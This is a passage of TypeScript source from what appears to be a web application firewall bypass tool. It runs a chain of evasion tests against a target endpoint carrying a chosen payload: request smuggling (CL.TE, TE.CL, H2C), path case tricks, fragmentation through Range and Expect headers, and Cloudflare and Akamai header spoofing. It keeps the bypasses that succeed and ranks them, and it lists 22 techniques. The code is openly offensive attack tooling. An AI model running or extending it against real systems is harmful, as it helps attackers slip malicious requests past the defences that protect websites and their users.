      const caseResults = await PathNormalizationBypass.testCaseSensitivity(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...caseResults);
    } catch {}

    // 6. Request smuggling
    try {
      const clteResult = await RequestSmugglingBypass.testCLTE(config.endpoint, config.originalPayload, enhancedConfig);
      if (clteResult) allResults.push(clteResult);
    } catch {}

    try {
      const teclResult = await RequestSmugglingBypass.testTECL(config.endpoint, config.originalPayload, enhancedConfig);
      if (teclResult) allResults.push(teclResult);
    } catch {}

    try {
      const h2cResult = await RequestSmugglingBypass.testH2C(config.endpoint, config.originalPayload, enhancedConfig);
      if (h2cResult) allResults.push(h2cResult);
    } catch {}

    // 7. Fragmentation
    try {
      const partialResults = await FragmentationBypass.testPartialContent(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...partialResults);
    } catch {}

    try {
      const expectResult = await FragmentationBypass.testExpect(config.endpoint, config.originalPayload, enhancedConfig);
      if (expectResult) allResults.push(expectResult);
    } catch {}

    // 8. CDN-specific bypasses
    try {
      const cfResults = await CDNBypass.testCloudflare(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...cfResults);
    } catch {}

    try {
      const akamaiResults = await CDNBypass.testAkamai(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...akamaiResults);
    } catch {}

    // Sort by confidence and success
    return allResults
      .filter(r => r.success)
      .sort((a, b) => b.confidence - a.confidence);
  }

  /**
   * Get list of all available bypass techniques
   */
  static getTechniques(): string[] {
    return [
      'Multi-layer encoding chains',
      'HTTP/2 Trailer header',
      'HTTP/2 pseudo-header abuse',
      'Chunked TE with unusual sizes',
      'TE header confusion (CL.TE)',
      'X-Forwarded-For variants',
      'Host header injection',
      'X-Original-URL path bypass',
      'Full client-hints (Chrome 131)',
      'Mobile client-hints (Android)',
      'Unicode normalization',
      'Case sensitivity',
      'CL.TE smuggling',
      'TE.CL smuggling',
      'H2C upgrade',
      'Partial content (Range header)',
      'Expect: 100-continue',
      'CF-Ray header manipulation',
      'CF-IPCountry header',
      'CF-Connecting-IP header',
      'X-Akamai-Transformed header',
      'Akamai edge diagnostic pragma',
    ];
  }
}
